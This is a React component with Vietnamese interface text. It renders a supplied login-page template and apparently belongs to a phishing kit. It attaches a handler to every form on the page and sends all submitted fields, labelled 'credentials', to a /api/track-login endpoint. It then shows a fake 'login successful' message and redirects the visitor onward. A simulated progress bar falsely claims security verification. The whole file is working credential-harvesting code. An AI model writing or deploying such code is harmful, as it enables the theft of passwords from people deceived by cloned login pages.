import { useState, useEffect, useCallback } from 'react';
import './LoginViewer.css';

const LoginViewer = ({ 
  website, 
  loginTemplateContent,
  onFormSubmit 
}) => {
  const [isLoading, setIsLoading] = useState(true);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [loadingProgress, setLoadingProgress] = useState(0);

  useEffect(() => {
    // Simulate loading progress
    const progressInterval = setInterval(() => {
      setLoadingProgress(prev => {
        if (prev >= 100) {
          clearInterval(progressInterval);
          setTimeout(() => setIsLoading(false), 300);
          return 100;
        }
        return prev + Math.random() * 20;
      });
    }, 80);

    // Track login page view
    trackLoginPageView();

    return () => clearInterval(progressInterval);
  }, [trackLoginPageView]);

  useEffect(() => {
    if (!isLoading) {
      // Setup form handlers after content loads
      setupFormHandlers();
    }
  }, [isLoading, setupFormHandlers]);

  const trackLoginPageView = useCallback(async () => {
    try {
      await fetch('/api/track-view', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          slug: website.slug,
          page_type: 'login',
          userAgent: navigator.userAgent,
          referrer: document.referrer,
          timestamp: new Date().toISOString()
        })
      });
    } catch (err) {
      console.log('Tracking failed:', err);
    }
  }, [website.slug]);

  const handleFormSubmit = useCallback(async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    const form = e.target;
    const formData = new FormData(form);
    const data = Object.fromEntries(formData.entries());

    try {
      // Track login attempt
      await fetch('/api/track-login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          slug: website.slug,
          credentials: data,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        })
      });

      // Show success animation
      setTimeout(() => {
        if (onFormSubmit) {
          onFormSubmit(data);
        } else {
          // Default redirect behavior
          if (website.redirect_url) {
            window.location.href = website.redirect_url;
          } else {
            showSuccessMessage();
            setTimeout(() => {
              window.location.href = `/${website.slug}`;
            }, 2000);
          }
        }
      }, 1500);

    } catch (error) {
      console.error('Login tracking failed:', error);
      setIsSubmitting(false);
    }
  }, [website.slug, website.redirect_url, onFormSubmit]);

  const setupFormHandlers = useCallback(() => {
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
      form.addEventListener('submit', handleFormSubmit);
    });
  }, [handleFormSubmit]);

  const showSuccessMessage = () => {
    const successDiv = document.createElement('div');
    successDiv.className = 'login-success-message';
    successDiv.innerHTML = `
      <div class="success-content">
        <div class="success-icon">✓</div>
        <h3>Đăng nhập thành công!</h3>
        <p>Đang chuyển hướng...</p>
      </div>
    `;
    document.body.appendChild(successDiv);

    setTimeout(() => {
      successDiv.remove();
    }, 3000);
  };

  if (isLoading) {
    return (
      <div className="login-loader">
        <div className="loader-container">
          <div className="loader-logo">
            {website.thumbnail ? (
              <img src={website.thumbnail} alt={website.title} />
            ) : (
              <div className="default-logo">
                <div className="logo-icon"></div>
              </div>
            )}
          </div>
          
          <div className="loader-content">
            <h2>Đăng nhập - {website.title}</h2>
            <div className="progress-bar">
              <div 
                className="progress-fill" 
                style={{ width: `${loadingProgress}%` }}
              ></div>
            </div>
            <p className="loading-text">
              {loadingProgress < 40 && 'Đang tải trang đăng nhập...'}
              {loadingProgress >= 40 && loadingProgress < 80 && 'Đang xác thực bảo mật...'}
              {loadingProgress >= 80 && 'Sẵn sàng!'}
            </p>
          </div>
        </div>
        
        <div className="loader-background">
          <div className="security-animation">
            <div className="shield-icon">
              <svg width="60" height="60" viewBox="0 0 24 24" fill="none">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className={`login-container ${isSubmitting ? 'submitting' : ''}`}>
      {/* Submission overlay */}
      {isSubmitting && (
        <div className="submission-overlay">
          <div className="submission-content">
            <div className="submission-spinner">
              <div className="spinner-ring"></div>
              <div className="spinner-ring"></div>
              <div className="spinner-ring"></div>
            </div>
            <h3>Đang xử lý đăng nhập...</h3>
            <p>Vui lòng đợi trong giây lát</p>
          </div>
        </div>
      )}
      
      {/* Main login content */}
      <div className="login-content">
        <div 
          className="login-template-content"
          dangerouslySetInnerHTML={{ __html: loginTemplateContent }}
        />
      </div>

      {/* Back to main page button */}
      <button 
        className="back-to-main-btn"
        onClick={() => window.location.href = `/${website.slug}`}
        title="Quay lại trang chính"
      >
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
          <path d="M19 12H5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
          <path d="M12 19l-7-7 7-7" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
        </svg>
      </button>
    </div>
  );
};

export default LoginViewer;
